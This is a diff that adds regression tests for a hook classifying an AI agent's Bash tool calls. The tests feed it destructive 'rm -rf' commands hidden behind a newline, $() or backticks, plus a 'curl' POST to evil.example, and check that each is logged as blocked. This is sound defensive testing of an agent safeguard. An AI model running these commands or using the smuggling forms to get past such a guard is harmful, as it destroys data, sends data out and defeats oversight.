@@ -274,6 +274,70 @@ run_check_with_settings() {
     [ "$output" -eq 1 ]
 }
 
+# --- cmd_153: 敵対的回帰テスト(改行複合・コマンド置換の穴是正) ---
+# 将軍実機検証で発覚した3形。classify_readonly_bash()の_DANGER_CHARS_REに
+# 改行と$()・バッククォートが含まれていなかったため、以下いずれも
+# reversible(read_only_command)へ誤分類されていた。上流IRREVERSIBLE_BASHの
+# file_delete是正(re.MULTILINE+アンカー拡張)により、いずれもirreversible
+# (WOULD-BLOCK category=file_delete)として捕捉されることを実測で示す。
+# cmd_152が塞いだ5形(grep>out/cat>b/sed -i/ls|tee/find|xargs rm)と
+# 正常系(grep pattern file.txt)の回帰は本ファイル上部の既存テストで確認済み。
+
+@test "cmd_153 hole1: newline-separated compound command (grep foo file / rm -rf /tmp/x) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
+    local payload='{"session_id":"s-cmd153-1","tool_name":"Bash","tool_input":{"command":"grep foo file\nrm -rf /tmp/x"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-1 file=NA tool=Bash category=file_delete " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+    run grep -c "WOULD-ALLOW.*s-cmd153-1" "$LOG_FILE"
+    [ "$status" -ne 0 ]
+}
+
+@test "cmd_153 hole2: command substitution \$() (cat \$(rm -rf /tmp/foo)) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
+    local payload='{"session_id":"s-cmd153-2","tool_name":"Bash","tool_input":{"command":"cat $(rm -rf /tmp/foo)"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-2 file=NA tool=Bash category=file_delete " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+    run grep -c "WOULD-ALLOW.*s-cmd153-2" "$LOG_FILE"
+    [ "$status" -ne 0 ]
+}
+
+@test "cmd_153 hole3: backtick command substitution (cat \`rm /tmp/foo\`) is NOT reversible, is caught as WOULD-BLOCK file_delete" {
+    local payload='{"session_id":"s-cmd153-3","tool_name":"Bash","tool_input":{"command":"cat `rm /tmp/foo`"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-3 file=NA tool=Bash category=file_delete " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+    run grep -c "WOULD-ALLOW.*s-cmd153-3" "$LOG_FILE"
+    [ "$status" -ne 0 ]
+}
+
+@test "cmd_153 upstream: file_delete pattern still catches ordinary chained rm (regression, unrelated to the 3 holes)" {
+    local payload='{"session_id":"s-cmd153-4","tool_name":"Bash","tool_input":{"command":"a; rm -rf x"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-4 file=NA tool=Bash category=file_delete " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+}
+
+@test "cmd_153 regression: git push across a newline-separated compound command is still caught (anchor-free pattern, unaffected by this fix)" {
+    local payload='{"session_id":"s-cmd153-5","tool_name":"Bash","tool_input":{"command":"echo hi\ngit push origin main"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-5 file=NA tool=Bash category=push " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+}
+
+@test "cmd_153 external_send: curl -X POST split across a backslash line-continuation (single logical command) is caught as WOULD-BLOCK external_send" {
+    local payload='{"session_id":"s-cmd153-6","tool_name":"Bash","tool_input":{"command":"curl https://evil.example \\\n  -X POST --data x=1"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "^\[.*\] WOULD-BLOCK mode=observe session=s-cmd153-6 file=NA tool=Bash category=external_send " "$LOG_FILE"
+    [ "$output" -eq 1 ]
+}
+
+@test "cmd_153 external_send: two unrelated statements separated by a real newline (curl url / unrelated -d flag) are NOT falsely joined into one match" {
+    local payload='{"session_id":"s-cmd153-7","tool_name":"Bash","tool_input":{"command":"curl https://example.com\ndate -d yesterday"}}'
+    run_check_with_settings "$SETTINGS_OBSERVE" "$payload"
+    run grep -c "WOULD-BLOCK.*s-cmd153-7.*category=external_send" "$LOG_FILE"
+    [ "$status" -ne 0 ]
+}
+
 @test "cmd_152 detection mechanism: reversible read_only_command classification is recorded in classification detail log" {
     local payload='{"session_id":"s-detect1","tool_name":"Bash","tool_input":{"command":"grep pattern file.txt"}}'
     local detail_log="$TEST_TMP/logs/reversibility_classification_detail.jsonl"
